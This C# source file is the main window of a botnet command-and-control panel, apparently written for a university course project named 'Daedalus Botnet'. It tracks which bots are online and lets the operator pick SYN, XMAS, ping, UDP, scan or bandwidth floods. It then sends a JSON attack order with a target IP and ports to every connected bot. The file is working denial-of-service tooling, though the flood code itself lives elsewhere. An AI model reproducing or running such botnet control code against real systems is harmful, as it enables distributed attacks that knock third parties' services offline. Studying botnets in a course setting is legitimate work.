using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using Coms4507_Project.BotHandling;
using Newtonsoft.Json.Linq;
/**
*  Author: Angus Moore
*  Project: Coms4507 Daedalus Botnet Project.
*/
namespace Coms4507_Project
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        BotHandler botHandler;
        private string ip;
        private string attackType;
        private string attackStatus = "IDLE";
        private BrushConverter bc = new BrushConverter();
        List<string> listOfAllBots;
        private static readonly List<string> allBots = new List<string>()
        {
            "ANGRYORACLE",
            "ISLANDOASIS",
            "ARKFOLLOWER",
            "ENDUESCALLOP",
            "MOTHBED",
            "MAESTRO",
            "DECKLEAK",
            "DIXIE_IX",
            "CONTRASTEED",
            "JETMOSES",
            "DESPERADO_XIX",
            "GENESISJEEP",
            "RESERVEPEARL",
            "FRUGALSCALLOP",
            "GILGAMESHBED",
            "SLAW_VIII",
            "ATLAS_XV",
            "ULTRASTEED",
            "RAGESHOP",
        };
        public MainWindow()
        {
            InitializeComponent();
            // All custom stuff here.
            Initialise();
            botHandler = new BotHandler(ip);
            attackType = "NONE";
            listOfAllBots = new List<string>();
            // Start the updater.
            UpdateOnlineStatus();
        }


        public void Initialise()
        {
            GetIPAddress();
        }

        private void GetIPAddress()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            string externalIp = IPAddress.Parse(externalIpString).ToString();
            C2_SERVER_IP.Content = externalIp;
            ip = externalIp;
        }

        private void UpdateOnlineStatus()
        {
            // TODO: Go through each bot and change the text colour to LawnGreen when online.
            //      Currently unsure about how to properly do bindings, but I'm sure there's some nifty
            //      way to do pointer-based stuff, so when the variables update, that's reflected in the program.
            Action<object> updateBots = (object obj) =>
            {
                while(true)
                {
                    try
                    {
                        Thread.Sleep(250);
                        Trace.WriteLine("UPDATING BOT FOR THE UI");

                        // Update attack status
                        Dispatcher.Invoke(() =>
                        {
                            C2_ATTACK_STATUS.Text = attackStatus;
                            C2_TOTAL_BANDWIDTH.Text = $"{botHandler.GetTotalBandwidth()}";
                            C2_EXCEPTIONS_THROWN.Text = $"{botHandler.GetExceptionsThrown()}";
                        });

                        // Prints the terminal output from the bots to the commandline
                        Dispatcher.Invoke(() =>
                        {
                            string terminalText = "";
                            foreach (string output in botHandler.outputList.ToArray())
                            {
                                terminalText += output + Environment.NewLine;
                            }
                            TERMINAL_OUTPUT_BOTS.Text = terminalText;
                        });

                        // Go through and invoke the dispatcher for update on the colours.
                        foreach (string botName in botHandler.botIpPortDetails.Keys)
                        {
                            if (!listOfAllBots.Contains(botName))
                            {
                                listOfAllBots.Add(botName);
                            }
                            Trace.WriteLine(botName);

                            Dispatcher.Invoke(() =>
                            {
                                Label result = FindName($"{botName}_STATUS") as Label;
                                result.Content = "ONLINE";
                                result.Foreground = new SolidColorBrush(Colors.LawnGreen);
                            });
                        }

                        // Go and see if there's offline bots to account for.
                        foreach (string botName in listOfAllBots.ToArray())
                        {
                            if (!botHandler.botIpPortDetails.ContainsKey(botName))
                            {
                                Dispatcher.Invoke(() =>
                                {
                                    Label result = FindName($"{botName}_STATUS") as Label;
                                    result.Content = "OFFLINE";
                                    result.Foreground = new SolidColorBrush(Colors.Red);
                                });
                            }
                        }
                    } catch(Exception e)
                    {
                        Trace.WriteLine("IGNORING: " + e.Message);
                    }
                }
            };
            Task task = new Task(updateBots, "updateBots");
            task.Start();
        }

        private string FormatPorts(string portNumbers)
        {
            return "[" + portNumbers.Trim() + "]";
        }

        private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // SELECT SYN_FLOOD TO THE ATTACK TYPE
            attackType = "SYN_FLOOD";
            SYN_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void XMAS_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "XMAS_FLOOD";
            XMAS_FLOOD.Background = new SolidColorBrush(Colors.Red);
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void PING_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "PING_FLOOD";
            PING_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void UDP_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "UDP_FLOOD";
            UDP_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void SCAN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "SCAN_FLOOD";
            SCAN_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void BANDWIDTH_DDOS_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "BANDWIDTH_DDOS";
            BANDWIDTH_DDOS.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void ATTACK_BUTTON_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // THIS IS WHERE WE START THE ATTACK.

            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
            ATTACK_BUTTON.Content = "STARTING ATTACK";

            // Format the attack, and then mass distribute it out to all active bots.

            string targetIp = IP_ADDRESS.Text;
            string ports = PORTS.Text;
            string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.

            Dictionary<string, string> attackMessage = new Dictionary<string, string>
            {
                { "request", "attack" },
                { "attack", attackType },
                { "targetIP", targetIp },
                { "ports", "[" + ports.Trim() + "]" },
                { "runtime", runtime }
            };

            attackStatus = "ATTACK";
            botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());

            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
            ATTACK_BUTTON.Content = "STOP ATTACK";
        }

        
    }
}
